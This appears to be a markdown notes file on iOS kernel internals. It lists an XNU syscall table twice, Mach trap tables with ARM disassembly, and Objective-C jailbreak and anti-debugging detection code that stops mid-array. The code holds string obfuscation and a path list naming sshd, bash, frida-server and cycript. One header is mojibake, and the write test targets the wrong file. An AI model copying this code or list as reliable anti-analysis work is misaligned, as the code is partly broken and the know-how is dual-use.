2. fork                  801d7980 T
3. read                  801eb584 T
4. write                 801eb958 T
5. open                  800b13a4 T
6. close                 801ccab4 T
7. wait4                 801d56bc T
9. link                  800b18e8 T
10. unlink               800b1ff0 T
12. chdir                800b0c60 T
13. fchdir               800b0af0 T
14. mknod                800b14bc T
15. chmod                800b2b40 T
16. chown                800b2c9c T
18. getfsstat            800b088c T
20. getpid               801dc20c T
23. setuid               801dc4c0 T
24. getuid               801dc290 T
25. geteuid              801dc2a0 T
26. ptrace               801e812c T
27. recvmsg              8020a8fc T
28. sendmsg              8020a444 T
29. recvfrom             8020a528 T
30. accept               80209dfc T
31. getpeername          8020abc8 T
32. getsockname          8020ab18 T
33. access               800b24ac T
34. chflags              800b2928 T
35. fchflags             800b29f0 T
36. sync                 800b0320 T
37. kill                 801dfdcc T
39. getppid              801dc214 T
41. dup                  801cab04 T
42. pipe                 801edbe4 T
43. getegid              801dc318 T
46. sigaction            801deee8 T
47. getgid               801dc308 T
48. sigprocmask          801df42c T
49. getlogin             801dd0e8 T
50. setlogin             801dd160 T
51. acct                 801c54ec T
52. sigpending           801df5d0 T
53. sigaltstack          801dfd10 T
54. ioctl                801ebd1c T
55. reboot               801e8090 T
56. revoke               800b43f8 T
57. symlink              800b1b58 T
58. readlink             800b282c T
59. execve               801d4448 T
60. umask                800b43d0 T
61. chroot               800b0d30 T
65. msync                801d84d0 T
66. vfork                801d7018 T
73. munmap               801d857c T
74. mprotect             801d85b0 T
75. madvise              801d8668 T
78. mincore              801d86d4 T
79. getgroups            801dc328 T
80. setgroups            801dd02c T
81. getpgrp              801dc21c T
82. setpgid              801dc3c8 T
83. setitimer            801e7b78 T
85. swapon               8021be68 T
86. getitimer            801e7a30 T
89. getdtablesize        801ca6dc T
90. dup2                 801caf54 T
92. fcntl                801cb420 T
93. select               801ebfc8 T
95. fsync                800b3238 T
96. setpriority          801dd494 T
97. socket               802098a4 T
98. connect              80209e1c T
100. getpriority          801dd388 T
104. bind                 80209970 T
105. setsockopt           8020aa30 T
106. listen               80209adc T
 111. sigsuspend           801df5f8 T
116. gettimeofday         801e7840 T
117. getrusage            801de22c T
118. getsockopt           8020aa94 T
120. readv                801eb810 T
121. writev               801ebbb0 T
122. settimeofday         801e789c T
123. fchown               800b2dac T
124. fchmod               800b2c70 T
126. setreuid             801dc80c T
127. setregid             801dcba0 T
128. rename               800b3428 T
131. flock                801ce20c T
132. mkfifo               800b1798 T
133. sendto               8020a168 T
134. shutdown             8020aa00 T
135. socketpair           8020a00c T
136. mkdir                800b3d1c T
137. rmdir                800b3d5c T
138. utimes               800b2e60 T
139. futimes              800b3034 T
140. adjtime              801e79a0 T
142. gethostuuid          801ed6a4 T
147. setsid               801dc384 T
151. getpgid              801dc224 T
152. setprivexec          801dc1f4 T
153. pread                801eb774 T
154. pwrite               801ebad0 T
157. statfs               800b03c0 T
158. fstatfs              800b0678 T
159. unmount              800afe88 T
165. quotactl             800b03bc T
167. mount                800af068 T
169. csops                801dafd0 T
170. 170  old table       801db4bc T
173. waitid               801d5ab4 T
180. kdebug_trace         801c2db4 T
181. setgid               801dc9a4 T
182. setegid              801dcab0 T
183. seteuid              801dc710 T
184. sigreturn            8021e7e4 T
185. chud                 8021d4f4 T
187. fdatasync            800b32b0 T
188. stat                 800b2588 T
189. fstat                801ccfec T
190. lstat                800b26d4 T
191. pathconf             800b27c8 T
192. fpathconf            801cd048 T
194. getrlimit            801de074 T
195. setrlimit            801dd93c T
196. getdirentries        800b3f94 T
197. mmap                 801d7fc0 T
199. lseek                800b2068 T
200. truncate             800b30b4 T
201. ftruncate            800b3174 T
202. __sysctl             801e2478 T
203. mlock                801d8820 T
204. munlock              801d8878 T
205. undelete             800b1cf0 T
216. mkcomplex            800b12c4 T
220. getattrlist          8009b060 T
221. setattrlist          8009b0d8 T
222. getdirentriesattr    800b44e0 T
223. exchangedata         800b469c T
225. searchfs             800b48dc T
226. delete               800b202c T
227. copyfile             800b32cc T
228. fgetattrlist         80098488 T
229. fsetattrlist         8009b7e0 T
230. poll                 801ec72c T
231. watchevent           801ed054 T
232. waitevent            801ed1f8 T
233. modwatch             801ed368 T
234. getxattr             800b5550 T
235. fgetxattr            800b568c T
236. setxattr             800b578c T
237. fsetxattr            800b5898 T
238. removexattr          800b5994 T
239. fremovexattr         800b5a5c T
240. listxattr            800b5b1c T
241. flistxattr           800b5c00 T
242. fsctl                800b4dd4 T
243. initgroups           801dcea8 T
244. posix_spawn          801d351c T
245. ffsctl               800b5474 T
250. minherit             801d8630 T
266. shm_open             8020eb24 T
267. shm_unlink           8020f604 T
268. sem_open             8020df80 T
269. sem_close            8020e718 T
270. sem_unlink           8020e4e0 T
271. sem_wait             8020e76c T
272. sem_trywait          8020e834 T
273. sem_post             8020e8d8 T
274. sem_getvalue         8020e97c T
275. sem_init             8020e974 T
276. sem_destroy          8020e978 T
277. open_extended        800b11d8 T
278. umask_extended       800b4380 T
279. stat_extended        800b2530 T
280. lstat_extended       800b267c T
281. fstat_extended       801ccdd0 T
282. chmod_extended       800b2a30 T
283. fchmod_extended      800b2b74 T
284. access_extended      800b21a0 T
285. settid               801dcd2c T
286. gettid               801dc2b0 T
287. setsgroups           801dd03c T
288. getsgroups           801dc37c T
289. setwgroups           801dd040 T
290. getwgroups           801dc380 T
291. mkfifo_extended      800b16f4 T
292. mkdir_extended       800b3b30 T
294. shared_region_check_np 8021c3a4 T
296. vm_pressure_monitor  8021cb08 T
297. psynch_rw_longrdlock 802159ac T
298. psynch_rw_yieldwrlock 80215c60 T
299. psynch_rw_downgrade  80215c68 T
300. psynch_rw_upgrade    80215c64 T
301. psynch_mutexwait     80212bd8 T
302. psynch_mutexdrop     80213b9c T
303. psynch_cvbroad       80213bf0 T
304. psynch_cvsignal      802141c0 T
305. psynch_cvwait        80214648 T
306. psynch_rw_rdlock     80214d7c T
307. psynch_rw_wrlock     802159b0 T
308. psynch_rw_unlock     80215c6c T
309. psynch_rw_unlock2    80215f64 T
310. getsid               801dc254 T
311. settid_with_pid      801dcdcc T
312. psynch_cvclrprepost  80214c7c T
313. aio_fsync            801c5ed0 T
314. aio_return           801c60a8 T
315. aio_suspend          801c6330 T
316. aio_cancel           801c5a48 T
317. aio_error            801c5e24 T
318. aio_read             801c6088 T
319. aio_write            801c6544 T
320. lio_listio           801c6564 T
322. iopolicysys          801de420 T
323. process_policy       8021a72c T
324. mlockall             801d88b4 T
325. munlockall           801d88b8 T
327. issetugid            801dc4b0 T
328. __pthread_kill       801dfa44 T
329. __pthread_sigmask    801dfaa4 T
330. __sigwait            801dfb54 T
331. __disable_threadsignal 801df720 T
332. __pthread_markcancel 801df73c T
333. __pthread_canceled   801df784 T
334. __semwait_signal     801df924 T
336. proc_info            80218618 T
338. stat64               800b25d4 T
339. fstat64              801cd028 T
340. lstat64              800b2720 T
341. stat64_extended      800b2624 T
342. lstat64_extended     800b2770 T
343. fstat64_extended     801cd00c T
344. getdirentries64      800b4340 T
345. statfs64             800b06e0 T
346. fstatfs64            800b0828 T
347. getfsstat64          800b0a38 T
348. __pthread_chdir      800b0d28 T
349. __pthread_fchdir     800b0c58 T
350. audit                801c1a74 T
351. auditon              801c1a78 T
353. getauid              801c1a7c T
354. setauid              801c1a80 T
357. getaudit_addr        801c1a84 T
358. setaudit_addr        801c1a88 T
359. auditctl             801c1a8c T
360. bsdthread_create     80216ab8 T
361. bsdthread_terminate  80216d30 T
362. kqueue               801cf594 T
363. kevent               801cf614 T
364. lchown               800b2d94 T
365. stack_snapshot       801c520c T
366. bsdthread_register   80216d94 T
367. workq_open           802179e8 T
368. workq_kernreturn     80217e50 T
369. kevent64             801cf8ac T
370. __old_semwait_signal 801df7f8 T
371. __old_semwait_signal_nocancel 801df82c T
372. thread_selfid        80218354 T
373. ledger               801ed70c T
380. __mac_execve         801d4468 T
381. __mac_syscall        8027d0a8 T
382. __mac_get_file       8027cd50 T
383. __mac_set_file       8027cf98 T
384. __mac_get_link       8027ce74 T
385. __mac_set_link       8027d098 T
386. __mac_get_proc       8027c844 T
387. __mac_set_proc       8027c904 T
388. __mac_get_fd         8027cbfc T
389. __mac_set_fd         8027ce84 T
390. __mac_get_pid        8027c778 T
391. __mac_get_lcid       8027c9b8 T
392. __mac_get_lctx       8027ca7c T
393. __mac_set_lctx       8027cb38 T
394. setlcid              801dd228 T
395. getlcid              801dd310 T
396. read_nocancel        801eb5a4 T
397. write_nocancel       801eb978 T
398. open_nocancel        800b1434 T
399. close_nocancel       801ccad0 T
400. wait4_nocancel       801d56dc T
401. recvmsg_nocancel     8020a91c T
402. sendmsg_nocancel     8020a464 T
403. recvfrom_nocancel    8020a548 T
404. accept_nocancel      80209b1c T
405. msync_nocancel       801d84e8 T
406. fcntl_nocancel       801cb440 T
407. select_nocancel      801ebfe4 T
408. fsync_nocancel       800b32a8 T
409. connect_nocancel     80209e34 T
410. sigsuspend_nocancel  801df6b4 T
411. readv_nocancel       801eb830 T
412. writev_nocancel      801ebbd0 T
413. sendto_nocancel      8020a188 T
414. pread_nocancel       801eb794 T
415. pwrite_nocancel      801ebaf0 T
416. waitid_nocancel      801d5ad0 T
417. poll_nocancel        801ec74c T
420. sem_wait_nocancel    8020e788 T
421. aio_suspend_nocancel 801c6350 T
422. __sigwait_nocancel   801dfb8c T
423. __semwait_signal_nocancel 801df958 T
424. __mac_mount          800af08c T
425. __mac_get_mount      8027d2a0 T
426. __mac_getfsstat      800b08b0 T
427. fsgetpath            800b5ce4 T
428. audit_session_self   801c1a68 T
429. audit_session_join   801c1a6c T
430. fileport_makeport    801ce2f0 T
431. fileport_makefd      801ce494 T
432. audit_session_port   801c1a70 T
433. pid_suspend          8021c180 T
434. pid_resume           8021c1f0 T
435. pid_hibernate        8021c268 T
436. pid_shutdown_sockets 8021c2c0 T
438. shared_region_map_and_slide_np 8021c954 T
439. kas_info             8021cb50 T   ; Provides ASLR information to user space 
                                       ; (intentionally crippled in iOS, works in ML)
440. memorystatus_control 801e62a0 T   ;; Controls JetSam - supersedes old sysctl interface
441. guarded_open_np      801cead0 T  
442. guarded_close_np     801cebdc T

Mach
XNU also supports the Mach personality, which is distinct from that of the UNIX syscalls discussed above. Mach syscalls (on 32-bit systems like iOS) are encoded as negative numbers, which is clever, since POSIX system calls are all non-negative. For example, consider mach_msg_trap:

_mach_msg_trap:
0001a8b4        e1a0c00d        mov     ip, sp
0001a8b8        e92d0170        push    {r4, r5, r6, r8}
0001a8bc        e89c0070        ldm     ip, {r4, r5, r6}
0001a8c0        e3e0c01e        mvn     ip, #30 @ 0x1e    ; Move NEGATIVE -30 into IP (R12)
0001a8c4        ef000080        svc     0x00000080        ; issue a supervisor call
0001a8c8        e8bd0170        pop     {r4, r5, r6, r8}
0001a8cc        e12fff1e        bx      lr
..
_semaphore_signal_all_trap:
0001a8f8        e3e0c021        mvn     ip, #33 @ 0x21   ; NEGATIVE -33 into IP (R12)
0001a8fc        ef000080        svc     0x00000080
0001a900        e12fff1e        bx      lr

Mach system calls are commonly known as "traps", and are maintained in a Mach Trap table. iOS's fleh_swi handler (the kernel entry point on the other side of the "SWI" or "SVC" command) checks the system call number - if it is negative, it is flipped (2's complement), and interpreted as Mach trap instead.

mach_trap_table
In iOS 5.x, the mach_trap_table is not far from the page_size export, and right next to the trap names. kern_invalid is the equivalent of ENOSYS. All the traps are ARM Thumb. The joker binary can be used to find the Mach trap table, as well. The following shows iOS 6.0.b1's table:

$ ./joker -ls mach kernel.iPod4.iOS6.0b1
This is an ARM binary. Applying iOS kernel signatures
mach_trap_table offset in file (for patching purposes): 3064992 (0x2ec4a0)
Kern invalid should be 0x80027ec1. Ignoring those
..This appears to be XNU 2107.1.78
 10 _kernelrpc_mach_vm_allocate_trap         80014460 T
 12 _kernelrpc_mach_vm_deallocate_trap       800144cc T
 14 _kernelrpc_mach_vm_protect_trap          80014510 T
 16 _kernelrpc_mach_port_allocate_trap       80014564 T
 17 _kernelrpc_mach_port_destroy_trap        800145b4 T
 18 _kernelrpc_mach_port_deallocate_trap     800145f0 T
 19 _kernelrpc_mach_port_mod_refs_trap       8001462c T
 20 _kernelrpc_mach_port_move_member_trap    8001466c T
 21 _kernelrpc_mach_port_insert_right_trap   800146b0 T
 22 _kernelrpc_mach_port_insert_member_trap  80014710 T
 23 _kernelrpc_mach_port_extract_member_trap 80014754 T
 26 mach_reply_port                          8001b5b4 T
 27 thread_self_trap                         8001b598 T
 28 task_self_trap                           8001b578 T
 29 host_self_trap                           80019910 T
 31 mach_msg_trap                            80014ec0 T
 32 mach_msg_overwrite_trap                  80014d20 T
 33 semaphore_signal_trap                    80027188 T
 34 semaphore_signal_all_trap                8002720c T
 35 semaphore_signal_thread_trap             80027114 T
 36 semaphore_wait_trap                      800274b0 T
 37 semaphore_wait_signal_trap               80027658 T
 38 semaphore_timedwait_trap                 80027598 T
 39 semaphore_timedwait_signal_trap          8002773c T
 44 task_name_for_pid                        8021a838 T
 45 task_for_pid                             8021a688 T
 46 pid_for_task                             8021a63c T
 48 macx_swapon                              8021b414 T
 49 macx_swapoff                             8021b668 T
 51 macx_triggers                            8021b3f4 T
 52 macx_backing_store_suspend               8021b370 T
 53 macx_backing_store_recovery              8021b318 T
 58 pfz_exit                                 80027818 T
 59 swtch_pri                                800278e4 T
 60 swtch                                    8002781c T
 61 thread_switch                            80027ad4 T
 62 clock_sleep_trap                         80017520 T
 89 mach_timebase_info_trap                  80016658 T
 90 mach_wait_until_trap                     80016d20 T
 91 mk_timer_create_trap                     8001f2f4 T
 92 mk_timer_destroy_trap                    8001f500 T
 93 mk_timer_arm_trap                        8001f544 T
 94 mk_timer_cancel_trap                     8001f5c8 T
100 iokit_user_client_trap                   8026c11c T
```
## Appleæä¾›çš„System Call Table å¯ä»¥æŸ¥å‡ºå‡½æ•°çš„ç¼–å·
```

1. exit                  801d4a74 T
2. fork                  801d7980 T
3. read                  801eb584 T
4. write                 801eb958 T
5. open                  800b13a4 T
6. close                 801ccab4 T
7. wait4                 801d56bc T
9. link                  800b18e8 T
10. unlink               800b1ff0 T
12. chdir                800b0c60 T
13. fchdir               800b0af0 T
14. mknod                800b14bc T
15. chmod                800b2b40 T
16. chown                800b2c9c T
18. getfsstat            800b088c T
20. getpid               801dc20c T
23. setuid               801dc4c0 T
24. getuid               801dc290 T
25. geteuid              801dc2a0 T
26. ptrace               801e812c T
27. recvmsg              8020a8fc T
28. sendmsg              8020a444 T
29. recvfrom             8020a528 T
30. accept               80209dfc T
31. getpeername          8020abc8 T
32. getsockname          8020ab18 T
33. access               800b24ac T
34. chflags              800b2928 T
35. fchflags             800b29f0 T
36. sync                 800b0320 T
37. kill                 801dfdcc T
39. getppid              801dc214 T
41. dup                  801cab04 T
42. pipe                 801edbe4 T
43. getegid              801dc318 T
46. sigaction            801deee8 T
47. getgid               801dc308 T
48. sigprocmask          801df42c T
49. getlogin             801dd0e8 T
50. setlogin             801dd160 T
51. acct                 801c54ec T
52. sigpending           801df5d0 T
53. sigaltstack          801dfd10 T
54. ioctl                801ebd1c T
55. reboot               801e8090 T
56. revoke               800b43f8 T
57. symlink              800b1b58 T
58. readlink             800b282c T
59. execve               801d4448 T
60. umask                800b43d0 T
61. chroot               800b0d30 T
65. msync                801d84d0 T
66. vfork                801d7018 T
73. munmap               801d857c T
74. mprotect             801d85b0 T
75. madvise              801d8668 T
78. mincore              801d86d4 T
79. getgroups            801dc328 T
80. setgroups            801dd02c T
81. getpgrp              801dc21c T
82. setpgid              801dc3c8 T
83. setitimer            801e7b78 T
85. swapon               8021be68 T
86. getitimer            801e7a30 T
89. getdtablesize        801ca6dc T
90. dup2                 801caf54 T
92. fcntl                801cb420 T
93. select               801ebfc8 T
95. fsync                800b3238 T
96. setpriority          801dd494 T
97. socket               802098a4 T
98. connect              80209e1c T
100. getpriority          801dd388 T
104. bind                 80209970 T
105. setsockopt           8020aa30 T
106. listen               80209adc T
 111. sigsuspend           801df5f8 T
116. gettimeofday         801e7840 T
117. getrusage            801de22c T
118. getsockopt           8020aa94 T
120. readv                801eb810 T
121. writev               801ebbb0 T
122. settimeofday         801e789c T
123. fchown               800b2dac T
124. fchmod               800b2c70 T
126. setreuid             801dc80c T
127. setregid             801dcba0 T
128. rename               800b3428 T
131. flock                801ce20c T
132. mkfifo               800b1798 T
133. sendto               8020a168 T
134. shutdown             8020aa00 T
135. socketpair           8020a00c T
136. mkdir                800b3d1c T
137. rmdir                800b3d5c T
138. utimes               800b2e60 T
139. futimes              800b3034 T
140. adjtime              801e79a0 T
142. gethostuuid          801ed6a4 T
147. setsid               801dc384 T
151. getpgid              801dc224 T
152. setprivexec          801dc1f4 T
153. pread                801eb774 T
154. pwrite               801ebad0 T
157. statfs               800b03c0 T
158. fstatfs              800b0678 T
159. unmount              800afe88 T
165. quotactl             800b03bc T
167. mount                800af068 T
169. csops                801dafd0 T
170. 170  old table       801db4bc T
173. waitid               801d5ab4 T
180. kdebug_trace         801c2db4 T
181. setgid               801dc9a4 T
182. setegid              801dcab0 T
183. seteuid              801dc710 T
184. sigreturn            8021e7e4 T
185. chud                 8021d4f4 T
187. fdatasync            800b32b0 T
188. stat                 800b2588 T
189. fstat                801ccfec T
190. lstat                800b26d4 T
191. pathconf             800b27c8 T
192. fpathconf            801cd048 T
194. getrlimit            801de074 T
195. setrlimit            801dd93c T
196. getdirentries        800b3f94 T
197. mmap                 801d7fc0 T
199. lseek                800b2068 T
200. truncate             800b30b4 T
201. ftruncate            800b3174 T
202. __sysctl             801e2478 T
203. mlock                801d8820 T
204. munlock              801d8878 T
205. undelete             800b1cf0 T
216. mkcomplex            800b12c4 T
220. getattrlist          8009b060 T
221. setattrlist          8009b0d8 T
222. getdirentriesattr    800b44e0 T
223. exchangedata         800b469c T
225. searchfs             800b48dc T
226. delete               800b202c T
227. copyfile             800b32cc T
228. fgetattrlist         80098488 T
229. fsetattrlist         8009b7e0 T
230. poll                 801ec72c T
231. watchevent           801ed054 T
232. waitevent            801ed1f8 T
233. modwatch             801ed368 T
234. getxattr             800b5550 T
235. fgetxattr            800b568c T
236. setxattr             800b578c T
237. fsetxattr            800b5898 T
238. removexattr          800b5994 T
239. fremovexattr         800b5a5c T
240. listxattr            800b5b1c T
241. flistxattr           800b5c00 T
242. fsctl                800b4dd4 T
243. initgroups           801dcea8 T
244. posix_spawn          801d351c T
245. ffsctl               800b5474 T
250. minherit             801d8630 T
266. shm_open             8020eb24 T
267. shm_unlink           8020f604 T
268. sem_open             8020df80 T
269. sem_close            8020e718 T
270. sem_unlink           8020e4e0 T
271. sem_wait             8020e76c T
272. sem_trywait          8020e834 T
273. sem_post             8020e8d8 T
274. sem_getvalue         8020e97c T
275. sem_init             8020e974 T
276. sem_destroy          8020e978 T
277. open_extended        800b11d8 T
278. umask_extended       800b4380 T
279. stat_extended        800b2530 T
280. lstat_extended       800b267c T
281. fstat_extended       801ccdd0 T
282. chmod_extended       800b2a30 T
283. fchmod_extended      800b2b74 T
284. access_extended      800b21a0 T
285. settid               801dcd2c T
286. gettid               801dc2b0 T
287. setsgroups           801dd03c T
288. getsgroups           801dc37c T
289. setwgroups           801dd040 T
290. getwgroups           801dc380 T
291. mkfifo_extended      800b16f4 T
292. mkdir_extended       800b3b30 T
294. shared_region_check_np 8021c3a4 T
296. vm_pressure_monitor  8021cb08 T
297. psynch_rw_longrdlock 802159ac T
298. psynch_rw_yieldwrlock 80215c60 T
299. psynch_rw_downgrade  80215c68 T
300. psynch_rw_upgrade    80215c64 T
301. psynch_mutexwait     80212bd8 T
302. psynch_mutexdrop     80213b9c T
303. psynch_cvbroad       80213bf0 T
304. psynch_cvsignal      802141c0 T
305. psynch_cvwait        80214648 T
306. psynch_rw_rdlock     80214d7c T
307. psynch_rw_wrlock     802159b0 T
308. psynch_rw_unlock     80215c6c T
309. psynch_rw_unlock2    80215f64 T
310. getsid               801dc254 T
311. settid_with_pid      801dcdcc T
312. psynch_cvclrprepost  80214c7c T
313. aio_fsync            801c5ed0 T
314. aio_return           801c60a8 T
315. aio_suspend          801c6330 T
316. aio_cancel           801c5a48 T
317. aio_error            801c5e24 T
318. aio_read             801c6088 T
319. aio_write            801c6544 T
320. lio_listio           801c6564 T
322. iopolicysys          801de420 T
323. process_policy       8021a72c T
324. mlockall             801d88b4 T
325. munlockall           801d88b8 T
327. issetugid            801dc4b0 T
328. __pthread_kill       801dfa44 T
329. __pthread_sigmask    801dfaa4 T
330. __sigwait            801dfb54 T
331. __disable_threadsignal 801df720 T
332. __pthread_markcancel 801df73c T
333. __pthread_canceled   801df784 T
334. __semwait_signal     801df924 T
336. proc_info            80218618 T
338. stat64               800b25d4 T
339. fstat64              801cd028 T
340. lstat64              800b2720 T
341. stat64_extended      800b2624 T
342. lstat64_extended     800b2770 T
343. fstat64_extended     801cd00c T
344. getdirentries64      800b4340 T
345. statfs64             800b06e0 T
346. fstatfs64            800b0828 T
347. getfsstat64          800b0a38 T
348. __pthread_chdir      800b0d28 T
349. __pthread_fchdir     800b0c58 T
350. audit                801c1a74 T
351. auditon              801c1a78 T
353. getauid              801c1a7c T
354. setauid              801c1a80 T
357. getaudit_addr        801c1a84 T
358. setaudit_addr        801c1a88 T
359. auditctl             801c1a8c T
360. bsdthread_create     80216ab8 T
361. bsdthread_terminate  80216d30 T
362. kqueue               801cf594 T
363. kevent               801cf614 T
364. lchown               800b2d94 T
365. stack_snapshot       801c520c T
366. bsdthread_register   80216d94 T
367. workq_open           802179e8 T
368. workq_kernreturn     80217e50 T
369. kevent64             801cf8ac T
370. __old_semwait_signal 801df7f8 T
371. __old_semwait_signal_nocancel 801df82c T
372. thread_selfid        80218354 T
373. ledger               801ed70c T
380. __mac_execve         801d4468 T
381. __mac_syscall        8027d0a8 T
382. __mac_get_file       8027cd50 T
383. __mac_set_file       8027cf98 T
384. __mac_get_link       8027ce74 T
385. __mac_set_link       8027d098 T
386. __mac_get_proc       8027c844 T
387. __mac_set_proc       8027c904 T
388. __mac_get_fd         8027cbfc T
389. __mac_set_fd         8027ce84 T
390. __mac_get_pid        8027c778 T
391. __mac_get_lcid       8027c9b8 T
392. __mac_get_lctx       8027ca7c T
393. __mac_set_lctx       8027cb38 T
394. setlcid              801dd228 T
395. getlcid              801dd310 T
396. read_nocancel        801eb5a4 T
397. write_nocancel       801eb978 T
398. open_nocancel        800b1434 T
399. close_nocancel       801ccad0 T
400. wait4_nocancel       801d56dc T
401. recvmsg_nocancel     8020a91c T
402. sendmsg_nocancel     8020a464 T
403. recvfrom_nocancel    8020a548 T
404. accept_nocancel      80209b1c T
405. msync_nocancel       801d84e8 T
406. fcntl_nocancel       801cb440 T
407. select_nocancel      801ebfe4 T
408. fsync_nocancel       800b32a8 T
409. connect_nocancel     80209e34 T
410. sigsuspend_nocancel  801df6b4 T
411. readv_nocancel       801eb830 T
412. writev_nocancel      801ebbd0 T
413. sendto_nocancel      8020a188 T
414. pread_nocancel       801eb794 T
415. pwrite_nocancel      801ebaf0 T
416. waitid_nocancel      801d5ad0 T
417. poll_nocancel        801ec74c T
420. sem_wait_nocancel    8020e788 T
421. aio_suspend_nocancel 801c6350 T
422. __sigwait_nocancel   801dfb8c T
423. __semwait_signal_nocancel 801df958 T
424. __mac_mount          800af08c T
425. __mac_get_mount      8027d2a0 T
426. __mac_getfsstat      800b08b0 T
427. fsgetpath            800b5ce4 T
428. audit_session_self   801c1a68 T
429. audit_session_join   801c1a6c T
430. fileport_makeport    801ce2f0 T
431. fileport_makefd      801ce494 T
432. audit_session_port   801c1a70 T
433. pid_suspend          8021c180 T
434. pid_resume           8021c1f0 T
435. pid_hibernate        8021c268 T
436. pid_shutdown_sockets 8021c2c0 T
438. shared_region_map_and_slide_np 8021c954 T
439. kas_info             8021cb50 T   ; Provides ASLR information to user space 
                                       ; (intentionally crippled in iOS, works in ML)
440. memorystatus_control 801e62a0 T   ;; Controls JetSam - supersedes old sysctl interface
441. guarded_open_np      801cead0 T  
442. guarded_close_np     801cebdc T

```

## iPhoneIsJailbroken
```
#import "iPhoneIsJailbroken.h"
#import <dlfcn.h>
#import <mach-o/dyld.h>
#import <TargetConditionals.h>

@implementation iPhoneIsJailbroken

#define A(c)            (c) - 0x19
#define HIDE_STR(str)   do { char *p = str;  while (*p) *p++ -= 0x19; } while (0)
typedef int (*ptrace_ptr_t)(int _request, pid_t _pid, caddr_t _addr, int _data);
#if !defined(PT_DENY_ATTACH)
#define PT_DENY_ATTACH 31
#endif

BOOL DEBUGGING = YES;

#if TARGET_IPHONE_SIMULATOR && !defined(LC_ENCRYPTION_INFO)
#define LC_ENCRYPTION_INFO 0x21
struct encryption_info_command {
    uint32_t cmd;
    uint32_t cmdsize;
    uint32_t cryptoff;
    uint32_t cryptsize;
    uint32_t cryptid;
};
#endif

void LOG(NSString* loc)
{
    NSLog(@"Found: %@", loc);
}

CFRunLoopSourceRef gSocketSource;
BOOL fileExist(NSString* path)
{
    NSFileManager *fileManager = [NSFileManager defaultManager];
    BOOL isDirectory = NO;
    if([fileManager fileExistsAtPath:path isDirectory:&isDirectory]){
        return YES;
    }
    return NO;
}

BOOL directoryExist(NSString* path)
{
    NSFileManager *fileManager = [NSFileManager defaultManager];
    BOOL isDirectory = YES;
    if([fileManager fileExistsAtPath:path isDirectory:&isDirectory]){
        return YES;
    }
    return NO;
}

BOOL canOpen(NSString* path)
{
    FILE *file = fopen([path UTF8String], "r");
    if(file==nil){
        return fileExist(path) || directoryExist(path);
    }
    fclose(file);
    return YES;
}

// Preventing libobjc hooked, strstr implementation
const char* tuyul(const char* X, const char* Y)
{
    if (*Y == '\0')
        return X;

    for (int i = 0; i < strlen(X); i++)
    {
        if (*(X + i) == *Y)
        {
            char* ptr = tuyul(X + i + 1, Y + 1);
            return (ptr) ? ptr - 1 : NULL;
        }
    }

    return NULL;
}

BOOL isJb()
{
//    Check cydia URL
    if([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"cydia://package/com.avl.com"]])
    {
        return YES;
    }
    NSArray* checks = [[NSArray alloc]initWithObjects:@"/Application/Cydia.app",
                       @"/Library/MobileSubstrate/MobileSubstrate.dylib",
                       @"/bin/bash",
                       @"/usr/sbin/sshd",
                       @"/etc/apt",
                       @"/usr/bin/ssh",
                       @"/private/var/lib/apt",
                       @"/private/var/lib/cydia",
                       @"/private/var/tmp/cydia.log",
                       @"/Applications/WinterBoard.app",
                       @"/var/lib/cydia",
                       @"/private/etc/dpkg/origins/debian",
                       @"/bin.sh",
                       @"/private/etc/apt",
                       @"/etc/ssh/sshd_config",
                       @"/private/etc/ssh/sshd_config",
                       @"/Applications/SBSetttings.app",
                       @"/private/var/mobileLibrary/SBSettingsThemes/",
                       @"/private/var/stash",
                       @"/usr/libexec/sftp-server",
                       @"/usr/libexec/cydia/",
                       @"/usr/sbin/frida-server",
                       @"/usr/bin/cycript",
                       @"/usr/local/bin/cycript",
                       @"/usr/lib/libcycript.dylib",
                       @"/System/Library/LaunchDaemons/com.saurik.Cydia.Startup.plist",
                       @"/System/Library/LaunchDaemons/com.ikey.bbot.plist",
                       @"/Applications/FakeCarrier.app",
                       @"/Library/MobileSubstrate/DynamicLibraries/Veency.plist",
                       @"/Library/MobileSubstrate/DynamicLibraries/LiveClock.plist",
                       @"/usr/libexec/ssh-keysign",
                       @"/usr/libexec/sftp-server",
                       @"/Applications/blackra1n.app",
                       @"/Applications/IntelliScreen.app",
                       @"/Applications/Snoop-itConfig.app",
                       @"/var/checkra1n.dmg",
                       @"/var/binpack",
                       nil];
    //Check installed app
    for(NSString* check in checks)
    {
        if(canOpen(check))
        {
            if(DEBUGGING){LOG(check);}
            return YES;
        }
    }
    //symlink verification
    struct stat sym;
    if(lstat("/Applications", &sym) || lstat("/var/stash/Library/Ringtones", &sym) ||
       lstat("/var/stash/Library/Wallpaper", &sym) ||
       lstat("/var/stash/usr/include", &sym) ||
       lstat("/var/stash/usr/libexec", &sym)  ||
       lstat("/var/stash/usr/share", &sym) ||
       lstat("/var/stash/usr/arm-apple-darwin9", &sym))
    {
        if(sym.st_mode & S_IFLNK)
        {
            if(DEBUGGING){LOG(@"Symlink");}
            return YES;
        }
    }
    
    //Check process forking
    int pid = fork();
    if(!pid)
    {
        exit(1);
    }
    if(pid >= 0)
    {
        if(DEBUGGING){LOG(@"Fork");}
        return YES;
    }
    
    //Check permission to write to /private
    NSString *path = @"/private/avl.txt";
    NSFileManager *fileManager = [NSFileManager defaultManager];
    @try {
        NSError* error;
        NSString *test = @"AVL was here";
        [test writeToFile:test atomically:NO encoding:NSStringEncodingConversionAllowLossy error:&error];
        [fileManager removeItemAtPath:path error:nil];
        if(error==nil)
        {
            if(DEBUGGING){LOG(@"File creation");}
            return YES;
        }
        return NO;
    } @catch (NSException *exception) {
        return NO;
    }
}

char* UNHIDE_STR(char* str){
    do { char *p = str;  while (*p) *p++ += 0x19; } while (0);
    return str;
}

char* decryptString(char* str){
    str = UNHIDE_STR(str);
    str[strlen(str)]='\0';
    return str;
}

BOOL isInjectedWithDynamicLibrary()
{
    int i=0;
    while(true){
        const char *name = _dyld_get_image_name(i++);
        if(name==NULL){
            break;
        }
        if (name != NULL) {
            char cyinjectHide[] = {
                A('c'),
                A('y'),
                A('i'),
                A('n'),
                A('j'),
                A('e'),
                A('c'),
                A('t'),
                0
            };
            char libcycriptHide[] = {
                A('l'),
                A('i'),
                A('b'),
                A('c'),
                A('y'),
                A('c'),
                A('r'),
                A('i'),
                A('p'),
                A('t'),
                0
            };
            
            char libfridaHide[] = {
                A('F'),
                A('r'),
                A('i'),
                A('d'),
                A('a'),
                A('G'),
                A('a'),
                A('d'),
                A('g'),
                A('e'),
                A('t'),
                0
            };
            char zzzzLibertyDylibHide[] = {
                A('z'),
                A('z'),
